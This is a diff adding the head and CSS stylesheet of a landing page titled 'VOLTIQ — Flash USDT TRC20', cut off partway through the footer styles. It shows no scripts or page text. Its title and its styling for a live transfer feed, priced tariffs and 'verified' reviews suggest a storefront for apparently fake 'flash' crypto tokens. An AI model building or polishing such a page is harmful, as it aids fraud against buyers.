@@ -1,0 +1,2109 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <meta name="theme-color" content="#0a0a0a" />
+    <title>VOLTIQ — Flash USDT TRC20 · Instant · Non-custodial</title>
+    
+    <!-- Embedded SVG Favicon matching the brand -->
+    <link rel="icon" type="image/svg+xml" sizes="any" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cdefs%3E%3ClinearGradient id='lg' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0%25' stop-color='%23ff2b30'/%3E%3Cstop offset='100%25' stop-color='%23b3060a'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath fill='url(%23lg)' d='M8 12 L56 12 L46 26 L34 60 L26 32 L8 22 Z'/%3E%3Cpath fill='%23fff' opacity='.92' d='M14 16 L46 16 L38 26 L30 46 L26 30 L14 20 Z'/%3E%3C/svg%3E" />
+    <link rel="mask-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cdefs%3E%3ClinearGradient id='lg' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0%25' stop-color='%23ff2b30'/%3E%3Cstop offset='100%25' stop-color='%23b3060a'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath fill='url(%23lg)' d='M8 12 L56 12 L46 26 L34 60 L26 32 L8 22 Z'/%3E%3Cpath fill='%23fff' opacity='.92' d='M14 16 L46 16 L38 26 L30 46 L26 30 L14 20 Z'/%3E%3C/svg%3E" color="#ff060a" />
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+    <style>
+        /* ============= TRXify — Flash USDT TRC20 =============
+           Pure static site · Dark Tron palette · Fully responsive
+           ==================================================== */
+
+        *, *::before, *::after { box-sizing: border-box; }
+
+        :root {
+            --bg-0: #050506;
+            --bg-1: #0a0a0c;
+            --bg-2: #101014;
+            --bg-3: #16161c;
+            --line: rgba(255, 255, 255, 0.08);
+            --line-2: rgba(255, 255, 255, 0.14);
+            --text: #f4f4f6;
+            --text-mute: #9a9aa5;
+            --text-dim: #6d6d78;
+            --brand: #ff060a;
+            --brand-2: #ff2b30;
+            --brand-3: #b3060a;
+            --brand-glow: rgba(255, 6, 10, 0.35);
+            --green: #22c55e;
+            --amber: #f59e0b;
+
+            --radius-lg: 22px;
+            --radius-md: 14px;
+            --radius-sm: 10px;
+
+            --shadow-1: 0 8px 30px rgba(0, 0, 0, 0.35);
+            --shadow-brand: 0 10px 40px rgba(255, 6, 10, 0.35);
+
+            --grad-brand: linear-gradient(135deg, #ff2b30 0%, #ff060a 55%, #b3060a 100%);
+            --grad-text: linear-gradient(135deg, #ff4d52 0%, #ff060a 60%, #b3060a 100%);
+        }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            background: var(--bg-0);
+            color: var(--text);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            line-height: 1.55;
+            font-size: 16px;
+            overflow-x: hidden;
+        }
+
+        img, svg { display: block; max-width: 100%; }
+        a { color: inherit; text-decoration: none; }
+        button { font-family: inherit; }
+
+        .container {
+            width: 100%;
+            max-width: 1240px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+        @media (max-width: 640px) {
+            .container { padding: 0 18px; }
+        }
+
+        .mono { font-family: 'JetBrains Mono', ui-monospace, monospace; letter-spacing: -0.01em; }
+
+        .grad {
+            background: var(--grad-text);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            color: transparent;
+        }
+
+        /* ============= BACKGROUND AURORA ============= */
+        .bg-aurora {
+            position: fixed; inset: 0; z-index: -1;
+            overflow: hidden; pointer-events: none;
+            background:
+                radial-gradient(ellipse at top left, rgba(255,6,10,0.06), transparent 50%),
+                radial-gradient(ellipse at bottom right, rgba(179,6,10,0.05), transparent 55%),
+                var(--bg-0);
+        }
+        .aurora {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(90px);
+            opacity: 0.55;
+            animation: floaty 18s ease-in-out infinite;
+        }
+        .aurora.a1 {
+            top: -120px; left: -80px;
+            width: 520px; height: 520px;
+            background: radial-gradient(circle, rgba(255,43,48,0.5), transparent 60%);
+        }
+        .aurora.a2 {
+            bottom: -160px; right: -120px;
+            width: 620px; height: 620px;
+            background: radial-gradient(circle, rgba(179,6,10,0.55), transparent 65%);
+            animation-delay: -6s;
+        }
+        @keyframes floaty {
+            0%, 100% { transform: translate(0,0) scale(1); }
+            50% { transform: translate(30px, -20px) scale(1.05); }
+        }
+        .grid-overlay {
+            position: absolute; inset: 0;
+            background-image:
+                linear-gradient(rgba(255,255,255,0.035) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.035) 1px, transparent 1px);
+            background-size: 48px 48px;
+            mask-image: radial-gradient(ellipse at center, rgba(0,0,0,0.9) 30%, transparent 75%);
+            -webkit-mask-image: radial-gradient(ellipse at center, rgba(0,0,0,0.9) 30%, transparent 75%);
+            opacity: 0.6;
+        }
+
+        /* ============= BUTTONS ============= */
+        .btn {
+            display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+            padding: 12px 20px;
+            border-radius: 12px;
+            border: 1px solid transparent;
+            font-weight: 600;
+            font-size: 14.5px;
+            cursor: pointer;
+            transition: transform .15s ease, box-shadow .2s ease, background .2s ease, border-color .2s ease, opacity .2s ease;
+            white-space: nowrap;
+            user-select: none;
+            text-decoration: none;
+            color: var(--text);
+        }
+        .btn svg { flex: 0 0 auto; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-sm { padding: 9px 14px; font-size: 13.5px; border-radius: 10px; }
+        .btn-lg { padding: 15px 24px; font-size: 15px; border-radius: 14px; }
+        .btn-block { width: 100%; }
+
+        .btn-primary {
+            background: var(--grad-brand);
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(255,6,10,0.35), inset 0 1px 0 rgba(255,255,255,0.22);
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 10px 28px rgba(255,6,10,0.5), inset 0 1px 0 rgba(255,255,255,0.28);
+        }
+        .btn-primary:active:not(:disabled) { transform: translateY(0); }
+
+        .btn-ghost {
+            background: rgba(255,255,255,0.03);
+            border-color: var(--line);
+            color: var(--text);
+        }
+        .btn-ghost:hover { background: rgba(255,255,255,0.06); border-color: var(--line-2); }
+
+        /* ============= HEADER ============= */
+        .site-header {
+            position: sticky; top: 0; z-index: 60;
+            padding: 14px 0;
+            background: rgba(5,5,6,0.72);
+            backdrop-filter: saturate(140%) blur(14px);
+            -webkit-backdrop-filter: saturate(140%) blur(14px);
+            border-bottom: 1px solid var(--line);
+        }
+        .header-inner {
+            display: flex; align-items: center; justify-content: space-between;
+            gap: 18px;
+        }
+        .brand {
+            display: inline-flex; align-items: center; gap: 10px;
+            font-weight: 800;
+            letter-spacing: -0.01em;
+        }
+        .brand-logo {
+            width: 34px; height: 34px;
+            display: grid; place-items: center;
+            filter: drop-shadow(0 6px 14px rgba(255,6,10,0.35));
+        }
+        .brand-name { font-size: 18px; }
+        .brand-badge {
+            font-size: 10.5px; font-weight: 700;
+            padding: 3px 7px;
+            border-radius: 6px;
+            background: rgba(255,6,10,0.15);
+            color: #ff8a8d;
+            border: 1px solid rgba(255,6,10,0.25);
+            letter-spacing: 0.06em;
+        }
+
+        .main-nav { display: flex; gap: 4px; align-items: center; }
+        .main-nav a {
+            padding: 8px 14px;
+            border-radius: 10px;
+            font-size: 14px;
+            color: var(--text-mute);
+            transition: color .15s, background .15s;
+        }
+        .main-nav a:hover { color: var(--text); background: rgba(255,255,255,0.04); }
+
+        .header-actions { display: flex; align-items: center; gap: 10px; }
+        .net-pill {
+            display: inline-flex; align-items: center; gap: 8px;
+            padding: 7px 12px;
+            border-radius: 999px;
+            background: rgba(34,197,94,0.08);
+            border: 1px solid rgba(34,197,94,0.22);
+            font-size: 12.5px;
+            color: #86efac;
+        }
+        .net-pill .dot {
+            width: 7px; height: 7px; border-radius: 50%;
+            background: var(--green);
+            box-shadow: 0 0 0 3px rgba(34,197,94,0.18);
+            animation: pulse 1.8s ease-in-out infinite;
+        }
+
+        .hamburger {
+            display: none;
+            background: transparent; border: 1px solid var(--line);
+            width: 40px; height: 40px; border-radius: 10px;
+            cursor: pointer; padding: 0;
+        }
+        .hamburger span {
+            display: block; width: 18px; height: 2px; background: #fff;
+            margin: 3px auto; transition: transform .2s, opacity .2s;
+            border-radius: 2px;
+        }
+        .hamburger.open span:nth-child(1) { transform: translateY(5px) rotate(45deg); }
+        .hamburger.open span:nth-child(2) { opacity: 0; }
+        .hamburger.open span:nth-child(3) { transform: translateY(-5px) rotate(-45deg); }
+
+        .mobile-menu {
+            display: none;
+            flex-direction: column;
+            gap: 4px;
+            padding: 14px 24px 18px;
+            border-top: 1px solid var(--line);
+            background: rgba(5,5,6,0.95);
+        }
+        .mobile-menu.open { display: flex; }
+        .mobile-menu a {
+            padding: 12px 8px;
+            border-radius: 10px;
+            color: var(--text);
+            font-weight: 500;
+        }
+        .mobile-menu a:hover { background: rgba(255,255,255,0.04); }
+        .mobile-menu .btn { margin-top: 8px; }
+
+        @media (max-width: 960px) {
+            .main-nav { display: none; }
+            .net-pill { display: none; }
+            .hamburger { display: block; }
+        }
+        @media (max-width: 520px) {
+            .header-actions .btn-primary { display: none; }
+            .brand-badge { display: none; }
+        }
+
+        /* ============= HERO ============= */
+        .hero { padding: 72px 0 40px; position: relative; }
+        .hero-inner {
+            display: grid;
+            grid-template-columns: 1.15fr 1fr;
+            gap: 56px;
+            align-items: center;
+        }
+        @media (max-width: 960px) {
+            .hero-inner { grid-template-columns: 1fr; gap: 40px; }
+            .hero { padding: 48px 0 24px; }
+        }
+
+        .eyebrow {
+            display: inline-flex; align-items: center; gap: 10px;
+            padding: 7px 14px;
+            border-radius: 999px;
+            background: rgba(255,6,10,0.08);
+            border: 1px solid rgba(255,6,10,0.22);
+            color: #ffb0b3;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 22px;
+        }
+        .eyebrow .pulse {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: var(--brand);
+            box-shadow: 0 0 0 4px rgba(255,6,10,0.25);
+            animation: pulse 1.6s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.55; }
+        }
+
+        .hero-title {
+            font-size: clamp(38px, 6.2vw, 72px);
+            font-weight: 800;
+            line-height: 1.05;
+            letter-spacing: -0.03em;
+            margin: 0 0 20px;
+        }
+        .hero-title .mono {
+            font-weight: 700;
+            font-size: 0.88em;
+            padding: 2px 12px;
+            border-radius: 12px;
+            border: 1px solid var(--line-2);
+            background: rgba(255,255,255,0.04);
+            display: inline-block;
+            margin: 0 4px;
+            transform: translateY(-6px);
+        }
+        .hero-sub {
+            color: var(--text-mute);
+            font-size: 17px;
+            max-width: 560px;
+            margin: 0 0 28px;
+        }
+        .hero-sub strong { color: #fff; font-weight: 600; }
+
+        .hero-ctas { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 26px; }
+
+        .hero-trust {
+            list-style: none; padding: 0; margin: 0;
+            display: flex; flex-direction: column; gap: 10px;
+        }
+        .hero-trust li {
+            display: flex; align-items: center; gap: 10px;
+            color: var(--text-mute);
+            font-size: 14.5px;
+        }
+        .hero-trust li svg { color: var(--green); }
+        .hero-trust li strong { color: #fff; }
+
+        /* ============= HERO LIVE FEED (UPDATED) ============= */
+        .hero-feed {
+            position: relative;
+            padding: 22px;
+            border-radius: 22px;
+            background: linear-gradient(180deg, rgba(22,22,28,0.9), rgba(12,12,16,0.9));
+            border: 1px solid var(--line-2);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,6,10,0.08);
+            overflow: hidden;
+        }
+        .hero-feed::before {
+            content: '';
+            position: absolute; inset: -1px;
+            border-radius: inherit;
+            padding: 1px;
+            background: linear-gradient(140deg, rgba(255,6,10,0.4), transparent 40%, rgba(255,6,10,0.15));
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+                    mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor; mask-composite: exclude;
+            pointer-events: none;
+        }
+        .hf-head {
+            display: flex; justify-content: space-between; align-items: center;
+            padding-bottom: 14px;
+            border-bottom: 1px dashed var(--line);
+            margin-bottom: 4px;
+        }
+        .hf-title { font-weight: 800; font-size: 15px; letter-spacing: -0.01em; }
+        .hf-sub { color: var(--text-mute); font-size: 12px; margin-top: 2px; }
+        .hf-pill {
+            display: inline-flex; align-items: center; gap: 6px;
+            padding: 5px 10px;
+            border-radius: 999px;
+            background: rgba(255,6,10,0.10);
+            border: 1px solid rgba(255,6,10,0.28);
+            color: #ffb0b3;
+            font-size: 11.5px;
+            font-weight: 700;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+        }
+        .hf-pill-dot {
+            width: 6px; height: 6px; border-radius: 50%;
+            background: var(--brand);
+            box-shadow: 0 0 0 3px rgba(255,6,10,0.28);
+            animation: pulse 1.4s ease-in-out infinite;
+        }
+
+        .hf-list {
+            list-style: none;
+            padding: 0;
+            margin: 6px 0;
+            display: flex; flex-direction: column;
+            gap: 4px;
+        }
+        .hf-item {
+            display: grid;
+            grid-template-columns: 36px 1fr auto;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 4px;
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+            transition: opacity .3s ease, transform .3s ease;
+        }
+        .hf-item:last-child { border-bottom: 0; }
+        .hf-item.fade-out {
+            opacity: 0;
+            transform: translateX(-10px);
+        }
+        .hf-bolt {
+            width: 36px; height: 36px; border-radius: 50%;
+            display: grid; place-items: center;
+            background: rgba(255,6,10,0.12);
+            border: 1px solid rgba(255,6,10,0.3);
+            color: var(--brand-2);
+            flex: 0 0 auto;
+        }
+        .hf-main {
+            display: inline-flex; align-items: center; gap: 10px;
+            min-width: 0;
+            flex-wrap: wrap;
+        }
+        .hf-amount {
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700; color: #fff;
+            font-size: 14px;
+        }
+        .hf-unit {
+            font-size: 10.5px;
+            font-weight: 700;
+            letter-spacing: 0.06em;
+            color: var(--brand-2);
+            padding: 2px 8px;
+            background: rgba(255,6,10,0.15);
+            border: 1px solid rgba(255,6,10,0.3);
+            border-radius: 4px;
+        }
+        .hf-arrow { 
+            color: var(--text-dim); 
+            display: inline-flex;
+            font-size: 13px;
+        }
+        .hf-to {
+            font-size: 14px;
+            color: var(--text-mute);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .hf-meta {
+            display: inline-flex; align-items: center; justify-content: flex-end;
+            gap: 10px;
+            color: var(--text-dim); font-size: 12px;
+            white-space: nowrap;
+            flex: 0 0 auto;
+        }
+        .hf-wallet {
+            width: 16px; height: 16px; border-radius: 50%;
+            flex: 0 0 auto;
+        }
+        .hf-wallet.blue { background: #4a7dff; }
+        .hf-wallet.red { background: #ff4545; }
+        
+        .hf-check {
+            width: 18px; height: 18px; border-radius: 50%;
+            display: grid; place-items: center;
+            background: rgba(34,197,94,0.15);
+            color: var(--green);
+            flex: 0 0 auto;
+        }
+
+        .hf-foot {
+            display: flex; align-items: center; justify-content: space-between;
+            gap: 10px;
+            margin-top: 14px;
+            padding-top: 14px;
+            border-top: 1px dashed var(--line);
+        }
+        .hf-foot-item { display: inline-flex; flex-direction: column; gap: 3px; min-width: 0; }
+        .hf-foot-lbl {
+            font-size: 10px;
+            letter-spacing: 0.14em;
+            text-transform: uppercase;
+            color: var(--text-dim);
+            font-weight: 700;
+        }
+        .hf-foot-item .mono {
+            font-size: 12.5px;
+            color: #fff;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            max-width: 22ch;
+        }
+        .hf-foot-sep { width: 1px; height: 26px; background: var(--line); }
+
+        @media (max-width: 560px) {
+            .hero-feed { padding: 18px 16px; }
+            .hf-foot-item .mono { max-width: 12ch; }
+            .hf-to { max-width: 12ch; }
+            .hf-main { gap: 6px; }
+            .hf-item { grid-template-columns: 30px 1fr auto; gap: 8px; }
+            .hf-bolt { width: 30px; height: 30px; }
+        }
+
+        /* Trust bar */
+        .trust-bar {
+            margin-top: 48px;
+            display: grid;
+            grid-template-columns: 1fr auto 1fr auto 1fr auto 1fr;
+            align-items: center;
+            padding: 22px;
+            border-radius: 20px;
+            background: linear-gradient(180deg, rgba(22,22,28,0.7), rgba(12,12,16,0.7));
+            border: 1px solid var(--line);
+            gap: 14px;
+        }
+        .tb-item { text-align: center; }
+        .tb-val {
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+            font-size: clamp(20px, 2.4vw, 28px);
+            letter-spacing: -0.02em;
+            color: #fff;
+        }
+        .tb-lbl { color: var(--text-mute); font-size: 12.5px; margin-top: 4px; }
+        .tb-sep { width: 1px; height: 32px; background: var(--line); }
+
+        @media (max-width: 900px) {
+            .trust-bar { grid-template-columns: 1fr 1fr; gap: 20px; }
+            .tb-sep { display: none; }
+        }
+
+        /* ============= SECTIONS ============= */
+        .section { padding: 88px 0; position: relative; }
+        .section-alt { background: linear-gradient(180deg, transparent, rgba(255,6,10,0.03), transparent); }
+        @media (max-width: 640px) { .section { padding: 64px 0; } }
+
+        .section-head {
+            text-align: center;
+            max-width: 720px;
+            margin: 0 auto 48px;
+        }
+        .chip {
+            display: inline-block;
+            padding: 6px 14px;
+            border-radius: 999px;
+            background: rgba(255,6,10,0.1);
+            border: 1px solid rgba(255,6,10,0.25);
+            color: #ffb0b3;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            margin-bottom: 16px;
+        }
+        .section-head h2 {
+            font-size: clamp(30px, 4.2vw, 48px);
+            font-weight: 800;
+            letter-spacing: -0.03em;
+            line-height: 1.1;
+            margin: 0 0 14px;
+        }
+        .section-head p {
+            color: var(--text-mute);
+            font-size: 16.5px;
+            margin: 0;
+        }
+
+        /* ============= TARIFFS ============= */
+        .tariffs-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+        }
+        @media (max-width: 1100px) { .tariffs-grid { grid-template-columns: repeat(2, 1fr); } }
+        @media (max-width: 560px) { .tariffs-grid { grid-template-columns: 1fr; } }
+
+        .tariff {
+            position: relative;
+            padding: 26px 22px 24px;
+            border-radius: 20px;
+            background: linear-gradient(180deg, rgba(22,22,28,0.85), rgba(12,12,16,0.85));
+            border: 1px solid var(--line);
+            display: flex; flex-direction: column;
+            transition: transform .2s ease, border-color .2s ease, box-shadow .3s ease;
+            overflow: hidden;
+        }
+        .tariff:hover {
+            transform: translateY(-4px);
+            border-color: rgba(255,6,10,0.35);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,6,10,0.15);
+        }
+        .tariff.featured {
+            border-color: rgba(255,6,10,0.4);
+            background:
+                radial-gradient(120% 60% at 50% 0%, rgba(255,6,10,0.18), transparent 60%),
+                linear-gradient(180deg, rgba(30,20,22,0.9), rgba(16,10,12,0.9));
+            box-shadow: 0 20px 50px rgba(255,6,10,0.15);
+        }
+        .tariff-tag {
+            position: absolute; top: 14px; right: 14px;
+            padding: 5px 10px;
+            border-radius: 999px;
+            background: var(--grad-brand);
+            color: #fff;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            box-shadow: 0 4px 14px rgba(255,6,10,0.5);
+        }
+        .tariff-icon {
+            width: 46px; height: 46px; border-radius: 12px;
+            background: rgba(255,6,10,0.14);
+            border: 1px solid rgba(255,6,10,0.28);
+            display: grid; place-items: center;
+            margin-bottom: 18px;
+            color: var(--brand-2);
+        }
+        .tariff-name {
+            font-weight: 700; font-size: 15px; color: var(--text-mute);
+            margin-bottom: 6px;
+            letter-spacing: 0.02em;
+        }
+        .tariff-amount {
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 800;
+            font-size: clamp(28px, 3vw, 34px);
+            letter-spacing: -0.02em;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        .tariff-currency {
+            color: var(--brand-2);
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 18px;
+        }
+        .tariff-price {
+            display: flex; align-items: baseline; gap: 6px;
+            padding: 14px 0;
+            border-top: 1px dashed var(--line);
+            border-bottom: 1px dashed var(--line);
+            margin-bottom: 18px;
+        }
+        .tariff-price-val {
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+            font-size: 22px;
+            color: #fff;
+        }
+        .tariff-perks {
+            list-style: none; padding: 0; margin: 0 0 22px;
+            display: flex; flex-direction: column; gap: 8px;
+        }
+        .tariff-perks li {
+            display: flex; align-items: flex-start; gap: 8px;
+            color: var(--text-mute);
+            font-size: 13.5px;
+        }
+        .tariff-perks li svg { color: var(--green); margin-top: 2px; flex: 0 0 auto; }
+        .tariff-perks li strong { color: #fff; font-weight: 600; }
+        .tariff .btn { margin-top: auto; }
+
+        .tariffs-note {
+            margin-top: 24px;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            color: var(--text-mute); font-size: 13.5px;
+            text-align: center;
+        }
+        .tariffs-note svg { color: var(--brand-2); flex: 0 0 auto; }
+
+        /* ============= STEPS ============= */
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 18px;
+            position: relative;
+        }
+        @media (max-width: 1000px) { .steps { grid-template-columns: repeat(2, 1fr); } }
+        @media (max-width: 560px) { .steps { grid-template-columns: 1fr; } }
+        .step {
+            position: relative;
+            padding: 26px 22px;
+            border-radius: 18px;
+            background: linear-gradient(180deg, rgba(22,22,28,0.8), rgba(12,12,16,0.8));
+            border: 1px solid var(--line);
+        }
+        .step-num {
+            position: absolute; top: 18px; right: 18px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px; font-weight: 600;
+            color: var(--text-dim);
+            letter-spacing: 0.1em;
+        }
+        .step-icon {
+            width: 48px; height: 48px; border-radius: 12px;
+            display: grid; place-items: center;
+            background: rgba(255,6,10,0.14);
+            border: 1px solid rgba(255,6,10,0.28);
+            color: var(--brand-2);
+            margin-bottom: 16px;
+        }
+        .step h3 { margin: 0 0 8px; font-size: 17px; font-weight: 700; letter-spacing: -0.01em; }
+        .step p { margin: 0; color: var(--text-mute); font-size: 14.5px; }
+
+        /* ============= FEATURES ============= */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 18px;
+        }
+        @media (max-width: 900px) { .features-grid { grid-template-columns: repeat(2, 1fr); } }
+        @media (max-width: 560px) { .features-grid { grid-template-columns: 1fr; } }
+
+        .feature-card {
+            padding: 26px 22px;
+            border-radius: 18px;
+            background: linear-gradient(180deg, rgba(22,22,28,0.7), rgba(12,12,16,0.7));
+            border: 1px solid var(--line);
+            transition: border-color .2s, transform .2s;
+        }
+        .feature-card:hover { border-color: rgba(255,6,10,0.3); transform: translateY(-3px); }
+        .fc-icon {
+            width: 44px; height: 44px; border-radius: 12px;
+            background: rgba(255,6,10,0.14);
+            border: 1px solid rgba(255,6,10,0.28);
+            display: grid; place-items: center;
+            color: var(--brand-2);
+            margin-bottom: 16px;
+        }
+        .feature-card h4 { margin: 0 0 8px; font-size: 16.5px; font-weight: 700; letter-spacing: -0.01em; }
+        .feature-card p { margin: 0; color: var(--text-mute); font-size: 14px; }
+
+        /* ============= REVIEWS ============= */
+        .reviews-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 18px;
+        }
+        @media (max-width: 900px) { .reviews-grid { grid-template-columns: 1fr 1fr; } }
+        @media (max-width: 640px) { .reviews-grid { grid-template-columns: 1fr; } }
+
+        .review {
+            padding: 22px;
+            border-radius: 18px;
+            background: linear-gradient(180deg, rgba(22,22,28,0.75), rgba(12,12,16,0.75));
+            border: 1px solid var(--line);
+            cursor: pointer;
+            transition: border-color .2s, transform .2s;
+        }
+        .review:hover { border-color: rgba(255,6,10,0.3); transform: translateY(-3px); }
+        .rv-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+        .rv-user { display: flex; align-items: center; gap: 10px; }
+        .rv-avatar {
+            width: 40px; height: 40px; border-radius: 50%;
+            display: grid; place-items: center;
+            font-weight: 800; color: #fff;
+            background: var(--grad-brand);
+            font-size: 14px;
+        }
+        .rv-name { font-weight: 700; font-size: 14px; }
+        .rv-addr { font-family: 'JetBrains Mono', monospace; font-size: 11.5px; color: var(--text-dim); }
+        .rv-stars { display: flex; gap: 2px; color: #fbbf24; }
+        .rv-body { color: var(--text-mute); font-size: 14px; margin: 0 0 12px; }
+        .rv-foot {
+            display: flex; justify-content: space-between; align-items: center;
+            padding-top: 12px;
+            border-top: 1px solid var(--line);
+            font-size: 12px; color: var(--text-dim);
+        }
+        .rv-verified {
+            display: inline-flex; align-items: center; gap: 5px;
+            color: #86efac;
+            font-family: 'Inter', sans-serif;
+            font-size: 11.5px;
+            font-weight: 600;
+            padding: 3px 8px;
+            border-radius: 999px;
+            background: rgba(34,197,94,0.10);
+            border: 1px solid rgba(34,197,94,0.25);
+            letter-spacing: 0.02em;
+        }
+
+        /* ============= FAQ ============= */
+        .faq-container { max-width: 880px; }
+        .faq-list { display: flex; flex-direction: column; gap: 10px; }
+        .faq-item {
+            border: 1px solid var(--line);
+            border-radius: 14px;
+            background: rgba(22,22,28,0.6);
+            overflow: hidden;
+            transition: border-color .2s, background .2s;
+        }
+        .faq-item:hover { border-color: rgba(255,255,255,0.14); }
+        .faq-item.open { border-color: rgba(255,6,10,0.25); background: rgba(24,18,20,0.75); }
+        .faq-q {
+            width: 100%;
+            display: flex; align-items: center; justify-content: space-between; gap: 16px;
+            padding: 18px 22px;
+            background: transparent; border: 0;
+            cursor: pointer;
+            text-align: left;
+            color: #fff;
+            font-weight: 600;
+            font-size: 15.5px;
+        }
+        .faq-icon {
+            width: 26px; height: 26px; border-radius: 8px;
+            background: rgba(255,255,255,0.05);
+            display: grid; place-items: center;
+            color: var(--text-mute);
+            flex: 0 0 auto;
+            transition: transform .2s, background .2s, color .2s;
+        }
+        .faq-item.open .faq-icon { transform: rotate(45deg); background: rgba(255,6,10,0.15); color: var(--brand-2); }
+        .faq-a {
+            max-height: 0;
+            overflow: hidden;
+            padding: 0 22px;
+            color: var(--text-mute);
+            font-size: 14.5px;
+            transition: max-height .3s ease, padding .2s ease;
+        }
+        .faq-item.open .faq-a { max-height: 260px; padding: 0 22px 20px; }
+
+        .faq-cta {
+            margin-top: 24px;
+            display: flex; justify-content: space-between; align-items: center; gap: 16px;
+            padding: 22px;
+            border-radius: 18px;
+            background: linear-gradient(135deg, rgba(255,6,10,0.10), rgba(255,6,10,0.02));
+            border: 1px solid rgba(255,6,10,0.22);
+        }
+        .faq-cta h4 { margin: 0 0 4px; font-size: 16px; }
+        .faq-cta p { margin: 0; color: var(--text-mute); font-size: 14px; }
+        .faq-cta a { color: var(--brand-2); }
+        @media (max-width: 640px) {
+            .faq-cta { flex-direction: column; align-items: stretch; text-align: center; }
+        }
+
+        /* ============= FINAL CTA ============= */
+        .final-cta-wrap { padding-bottom: 60px; }
+        .final-cta {
+            position: relative;
+            display: grid;
+            grid-template-columns: 1.4fr 1fr;
+            gap: 40px;
+            align-items: center;
+            padding: 44px;
+            border-radius: 24px;
+            background:
+                radial-gradient(80% 100% at 100% 100%, rgba(255,6,10,0.18), transparent 60%),
+                linear-gradient(180deg, rgba(22,22,28,0.9), rgba(12,12,16,0.9));
+            border: 1px solid rgba(255,6,10,0.25);
+            overflow: hidden;
+        }
+        .final-cta-glow {
+            position: absolute; top: -80px; right: -80px;
+            width: 320px; height: 320px;
+            background: radial-gradient(circle, rgba(255,6,10,0.5), transparent 60%);
+            filter: blur(60px);
+            pointer-events: none;
+        }
+        .final-cta h2 {
+            font-size: clamp(26px, 3.4vw, 40px);
+            font-weight: 800;
+            letter-spacing: -0.03em;
+            line-height: 1.15;
+            margin: 12px 0 12px;
+        }
+        .final-cta p { color: var(--text-mute); font-size: 16px; margin: 0 0 22px; max-width: 500px; }
+        .final-cta-actions { display: flex; gap: 12px; flex-wrap: wrap; }
+
+        .final-cta-mini {
+            padding: 18px;
+            border-radius: 16px;
+            background: rgba(0,0,0,0.35);
+            border: 1px solid var(--line);
+            display: flex; flex-direction: column; gap: 10px;
+        }
+        .mini-row {
+            display: flex; align-items: center; gap: 10px;
+            font-size: 13.5px;
+            color: var(--text-mute);
+        }
+        .mini-row .dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: var(--green);
+            box-shadow: 0 0 0 4px rgba(34,197,94,0.18);
+        }
+        @media (max-width: 900px) {
+            .final-cta { grid-template-columns: 1fr; padding: 32px 24px; }
+        }
+
+        /* ============= FOOTER ============= */
+        .site-footer {
+            background: #060608;
+            border-top: 1px solid var(--line);
+            padding: 56px 0 24px;
+            margin-top: 40px;
+        }
+        .footer-inner {
+            display: grid;
+            grid-template-columns: 1.4fr 1fr 1fr 1fr;
+            gap: 40px;
+            padding-bottom: 40px;
+            border-bottom: 1px solid var(--line);
+        }
